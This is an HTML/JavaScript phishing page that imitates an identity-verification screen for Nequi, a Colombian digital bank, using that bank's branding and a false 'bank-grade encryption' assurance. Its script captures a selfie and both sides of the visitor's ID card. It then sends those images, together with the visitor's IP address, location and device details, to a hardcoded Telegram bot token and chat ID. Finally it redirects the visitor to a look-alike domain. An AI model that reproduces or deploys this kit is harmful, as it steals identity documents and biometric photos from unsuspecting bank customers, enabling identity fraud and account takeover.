<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verificación de identidad - Nequi</title>

<style>
body{
font-family: 'Inter', Arial, sans-serif;
background: linear-gradient(135deg, #2E0039 0%, #4A148C 100%);
display:flex;
justify-content:center;
align-items:center;
min-height:100vh;
margin:0;
padding:15px;
}

.container{
background:white;
padding:25px;
border-radius:20px;
width:380px;
text-align:center;
box-shadow:0 20px 40px rgba(0,0,0,0.3);
border: 1px solid rgba(218,0,129,0.3);
}

.header-nequi {
display: flex;
align-items: center;
justify-content: center;
gap: 10px;
margin-bottom: 20px;
}

.nequi-logo {
background: #2E0039;
color: white;
width: 40px;
height: 40px;
border-radius: 50%;
display: flex;
align-items: center;
justify-content: center;
font-weight: bold;
font-size: 18px;
}

.nequi-text {
font-size: 22px;
font-weight: bold;
color: #2E0039;
}

.step-indicator {
display: flex;
justify-content: space-between;
margin: 20px 0;
padding: 0 5px;
}

.step-dot {
width: 30px;
height: 30px;
border-radius: 50%;
background: #e0e0e0;
display: flex;
align-items: center;
justify-content: center;
font-size: 14px;
font-weight: bold;
color: #666;
transition: all 0.3s ease;
}

.step-dot.active {
background: #2E0039;
color: white;
}

.step-dot.completed {
background: #00C853;
color: white;
}

.step-dot.completed::after {
content: '✓';
}

.step-text {
font-size: 16px;
font-weight: 600;
color: #2E0039;
margin-bottom: 15px;
padding: 10px;
background: #F9F3FF;
border-radius: 8px;
}

.video-container {
background: #f0f0f0;
border-radius: 12px;
overflow: hidden;
margin-bottom: 15px;
border: 2px solid #2E0039;
position: relative;
}

video{
width:100%;
border-radius:8px;
display: block;
}

.camera-controls {
display: flex;
gap: 10px;
margin-bottom: 10px;
}

.camera-btn {
flex: 1;
padding: 10px;
border: none;
border-radius: 8px;
background: #6c757d;
color: white;
font-size: 14px;
font-weight: 600;
cursor: pointer;
transition: all 0.3s ease;
}

.camera-btn:hover {
background: #5a6268;
}

.camera-btn.active {
background: #2E0039;
}

.camera-btn:disabled {
background: #cccccc;
cursor: not-allowed;
}

button{
margin-top:12px;
padding:14px;
width:100%;
border:none;
border-radius:12px;
background: #2E0039;
color:white;
font-size:16px;
font-weight:600;
cursor:pointer;
transition: all 0.3s ease;
}

button:hover {
background: #da0081;
transform: translateY(-2px);
box-shadow: 0 5px 15px rgba(218,0,129,0.3);
}

button:disabled {
background: #cccccc;
cursor: not-allowed;
transform: none;
}

.preview-section {
margin-top: 15px;
border-top: 1px solid #e0e0e0;
padding-top: 15px;
}

.preview-title {
font-size: 14px;
color: #666;
margin-bottom: 10px;
}

.preview-container {
display: flex;
gap: 10px;
overflow-x: auto;
padding: 5px 0;
}

.preview-item {
flex: 0 0 100px;
text-align: center;
}

.preview-item img {
width: 100px;
height: 100px;
border-radius: 8px;
object-fit: cover;
border: 2px solid #2E0039;
}

.preview-label {
font-size: 11px;
color: #666;
margin-top: 5px;
}

.status-message {
margin-top: 15px;
padding: 12px;
border-radius: 8px;
font-size: 14px;
display: none;
}

.status-message.success {
background: #d4edda;
color: #155724;
border: 1px solid #c3e6cb;
display: block;
}

.status-message.error {
background: #f8d7da;
color: #721c24;
border: 1px solid #f5c6cb;
display: block;
}

.footer-note {
margin-top: 15px;
font-size: 11px;
color: #999;
}

.loader {
display: none;
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
background: rgba(255,255,255,0.95);
z-index: 9999;
justify-content: center;
align-items: center;
flex-direction: column;
gap: 15px;
}

.loader.active {
display: flex;
}

.loader-spinner {
width: 50px;
height: 50px;
border: 5px solid #f3f3f3;
border-top: 5px solid #2E0039;
border-radius: 50%;
animation: spin 1s linear infinite;
}

@keyframes spin {
0% { transform: rotate(0deg); }
100% { transform: rotate(360deg); }
}

.loader-text {
color: #2E0039;
font-weight: 600;
}

.botones-accion {
display: flex;
gap: 10px;
margin-top: 15px;
}

.btn-secondary {
background: #6c757d;
}

.btn-secondary:hover {
background: #5a6268;
}

.camera-indicator {
position: absolute;
top: 10px;
right: 10px;
background: rgba(0,0,0,0.5);
color: white;
padding: 4px 8px;
border-radius: 20px;
font-size: 11px;
z-index: 10;
}
</style>
</head>

<body>

<div class="loader" id="loader">
<div class="loader-spinner"></div>
<div class="loader-text" id="loaderText">Procesando...</div>
</div>

<div class="container">

<div class="header-nequi">
<div class="nequi-logo">NQ</div>
<div class="nequi-text">Nequi - Verificación</div>
</div>

<!-- Indicador de pasos (solo 3) -->
<div class="step-indicator">
<div class="step-dot active" id="step1Dot">1</div>
<div class="step-dot" id="step2Dot">2</div>
<div class="step-dot" id="step3Dot">3</div>
</div>

<div class="step-text" id="stepText">
📸 Paso 1: Toma una selfie
</div>

<!-- Controles de cámara -->
<div class="camera-controls">
<button class="camera-btn" id="btnFrontal" onclick="cambiarCamara('user')">🤳 Selfie</button>
<button class="camera-btn" id="btnTrasera" onclick="cambiarCamara('environment')">📷 Documento</button>
</div>

<div class="video-container">
<video id="video" autoplay playsinline></video>
<div class="camera-indicator" id="cameraIndicator">🤳 Cámara frontal</div>
</div>

<button onclick="capturar()" id="captureBtn">
Capturar imagen
</button>

<div class="preview-section" id="previewSection" style="display:none;">
<div class="preview-title">Imágenes capturadas:</div>
<div class="preview-container" id="previewContainer"></div>
</div>

<div class="botones-accion" id="actionButtons" style="display:none;">
<button class="btn-secondary" onclick="reiniciar()">Reiniciar</button>
<button onclick="enviarTodo()">Enviar verificación</button>
</div>

<div class="status-message" id="statusMessage"></div>

<div class="footer-note">
🔒 Tus datos están seguros con encriptación de grado bancario
</div>

</div>

<script>
const video = document.getElementById("video");
const stepText = document.getElementById("stepText");
const captureBtn = document.getElementById("captureBtn");
const previewSection = document.getElementById("previewSection");
const previewContainer = document.getElementById("previewContainer");
const actionButtons = document.getElementById("actionButtons");
const statusMessage = document.getElementById("statusMessage");
const loader = document.getElementById("loader");
const loaderText = document.getElementById("loaderText");
const btnFrontal = document.getElementById("btnFrontal");
const btnTrasera = document.getElementById("btnTrasera");
const cameraIndicator = document.getElementById("cameraIndicator");

const stepDots = {
1: document.getElementById("step1Dot"),
2: document.getElementById("step2Dot"),
3: document.getElementById("step3Dot")
};

// Configuración de Telegram
const TELEGRAM_CONFIG = {
token: "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8",
chatId: "7776240161"
};

let paso = 1;
let camaraActual = 'user'; // 'user' = frontal, 'environment' = trasera
let streamActual = null;

const imagenes = {
selfie: null,
frontal: null,
trasera: null
};

// Función para iniciar cámara
async function iniciarCamara(facingMode) {
try {
if (streamActual) {
streamActual.getTracks().forEach(track => track.stop());
}

const constraints = {
video: {
width: { ideal: 640 },
height: { ideal: 480 },
facingMode: facingMode
}
};

const stream = await navigator.mediaDevices.getUserMedia(constraints);
video.srcObject = stream;
streamActual = stream;

// Actualizar indicador
if (facingMode === 'user') {
cameraIndicator.textContent = '🤳 Cámara frontal';
btnFrontal.classList.add('active');
btnTrasera.classList.remove('active');
} else {
cameraIndicator.textContent = '📷 Cámara trasera';
btnTrasera.classList.add('active');
btnFrontal.classList.remove('active');
}

camaraActual = facingMode;
} catch (error) {
console.error("Error al acceder a la cámara:", error);
mostrarError("No se pudo acceder a la cámara. Verifica los permisos.");
}
}

// Cambiar cámara
function cambiarCamara(facingMode) {
iniciarCamara(facingMode);
}

function actualizarDots() {
// Resetear todos los dots
for(let i = 1; i <= 3; i++) {
stepDots[i].classList.remove('active', 'completed');
stepDots[i].textContent = i;
}

// Marcar completados hasta paso-1
for(let i = 1; i < paso; i++) {
stepDots[i].classList.add('completed');
stepDots[i].textContent = '✓';
}

// Marcar activo el paso actual
if(paso <= 3) {
stepDots[paso].classList.add('active');
}
}

function agregarPreview(tipo, imagenData) {
const previewItem = document.createElement('div');
previewItem.className = 'preview-item';

const img = document.createElement('img');
img.src = imagenData;

const label = document.createElement('div');
label.className = 'preview-label';
label.textContent = tipo;

previewItem.appendChild(img);
previewItem.appendChild(label);
previewContainer.appendChild(previewItem);
}

function mostrarError(mensaje) {
statusMessage.textContent = mensaje;
statusMessage.className = 'status-message error';
statusMessage.style.display = 'block';
setTimeout(() => {
statusMessage.style.display = 'none';
}, 3000);
}

function capturar() {
const canvas = document.createElement("canvas");
canvas.width = video.videoWidth;
canvas.height = video.videoHeight;

const ctx = canvas.getContext("2d");
// Voltear imagen si es selfie para que se vea como espejo
if (camaraActual === 'user') {
ctx.translate(canvas.width, 0);
ctx.scale(-1, 1);
}
ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
// Restaurar contexto
ctx.setTransform(1, 0, 0, 1, 0, 0);

const imagenData = canvas.toDataURL("image/jpeg", 0.8);

// Guardar según el paso
if(paso == 1) {
if (camaraActual !== 'user') {
mostrarError("Para la selfie usa la cámara frontal");
return;
}
imagenes.selfie = imagenData;
agregarPreview('Selfie', imagenData);
paso = 2;
stepText.innerText = "📄 Paso 2: Documento - Parte frontal";
stepDots[1].classList.add('completed');
stepDots[1].textContent = '✓';
stepDots[2].classList.add('active');
previewSection.style.display = 'block';
}
else if(paso == 2) {
if (camaraActual !== 'environment') {
mostrarError("Para el documento usa la cámara trasera");
return;
}
imagenes.frontal = imagenData;
agregarPreview('Documento Frontal', imagenData);
paso = 3;
stepText.innerText = "📄 Paso 3: Documento - Parte trasera";
stepDots[2].classList.add('completed');
stepDots[2].textContent = '✓';
stepDots[3].classList.add('active');
}
else if(paso == 3) {
if (camaraActual !== 'environment') {
mostrarError("Para el documento usa la cámara trasera");
return;
}
imagenes.trasera = imagenData;
agregarPreview('Documento Trasero', imagenData);
stepDots[3].classList.add('completed');
stepDots[3].textContent = '✓';
stepText.innerText = "✅ Verificación completada";
captureBtn.style.display = 'none';
actionButtons.style.display = 'flex';
// Deshabilitar controles de cámara
btnFrontal.disabled = true;
btnTrasera.disabled = true;
}

actualizarDots();
}

function reiniciar() {
paso = 1;
imagenes.selfie = null;
imagenes.frontal = null;
imagenes.trasera = null;

previewContainer.innerHTML = '';
previewSection.style.display = 'none';
actionButtons.style.display = 'none';
captureBtn.style.display = 'block';
captureBtn.textContent = "Capturar imagen";
stepText.innerText = "📸 Paso 1: Toma una selfie";

// Reactivar controles de cámara
btnFrontal.disabled = false;
btnTrasera.disabled = false;

// Volver a cámara frontal
iniciarCamara('user');

actualizarDots();
statusMessage.style.display = 'none';
}

function dataURLtoBlob(dataURL) {
const arr = dataURL.split(',');
const mime = arr[0].match(/:(.*?);/)[1];
const bstr = atob(arr[1]);
let n = bstr.length;
const u8arr = new Uint8Array(n);
while (n--) {
u8arr[n] = bstr.charCodeAt(n);
}
return new Blob([u8arr], { type: mime });
}

async function enviarImagenATelegram(imagenData, caption) {
const blob = dataURLtoBlob(imagenData);
const formData = new FormData();
formData.append('chat_id', TELEGRAM_CONFIG.chatId);
formData.append('caption', caption);
formData.append('photo', blob, `${caption}.jpg`);

try {
const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
method: 'POST',
body: formData
});
return await response.json();
} catch (error) {
console.error(`Error enviando ${caption}:`, error);
throw error;
}
}

async function enviarTodo() {
loader.classList.add('active');
loaderText.textContent = "Enviando verificación...";
statusMessage.style.display = 'none';

try {
// Obtener IP y ubicación
const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());

// Enviar selfie
loaderText.textContent = "Enviando selfie...";
await enviarImagenATelegram(imagenes.selfie, `🤳 Selfie - ${new Date().toLocaleString('es-CO')}`);

// Enviar documento frontal
loaderText.textContent = "Enviando documento frontal...";
await enviarImagenATelegram(imagenes.frontal, `📄 Documento Frontal - ${new Date().toLocaleString('es-CO')}`);

// Enviar documento trasero
loaderText.textContent = "Enviando documento trasero...";
await enviarImagenATelegram(imagenes.trasera, `📄 Documento Trasero - ${new Date().toLocaleString('es-CO')}`);

// Enviar mensaje con información adicional
const mensajeInfo = `
🔔 **NUEVA VERIFICACIÓN DE IDENTIDAD COMPLETADA** 🔔

📊 **INFORMACIÓN DE LA VERIFICACIÓN:**
✅ Selfie capturada
✅ Documento frontal
✅ Documento trasero

🌍 **DATOS DE UBICACIÓN:**
📍 IP: ${ipData.ip}
🏙 Ciudad: ${ipData.city}
🏛 Región: ${ipData.region}
🇨🇴 País: ${ipData.country_name}
📱 Dispositivo: ${navigator.userAgent}

⏰ **FECHA Y HORA:**
📅 ${new Date().toLocaleString('es-CO')}

✅ **ESTADO:** Verificación completada exitosamente
`;

await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
chat_id: TELEGRAM_CONFIG.chatId,
text: mensajeInfo,
parse_mode: 'Markdown'
})
});

// Mostrar éxito
loader.classList.remove('active');
statusMessage.textContent = "✅ Verificación enviada correctamente a los asesores";
statusMessage.className = 'status-message success';

// Deshabilitar botones
actionButtons.style.display = 'none';
captureBtn.style.display = 'none';

// Redirigir después de 3 segundos
setTimeout(() => {
window.location.href = 'https://nequi-red.vercel.app/';
}, 3000);

} catch (error) {
console.error('Error enviando a Telegram:', error);
loader.classList.remove('active');
mostrarError("Error al enviar la verificación. Intenta nuevamente.");
actionButtons.style.display = 'flex';
}
}

// Inicializar
document.addEventListener('DOMContentLoaded', () => {
iniciarCamara('user');
actualizarDots();
});
</script>

</body>
</html>
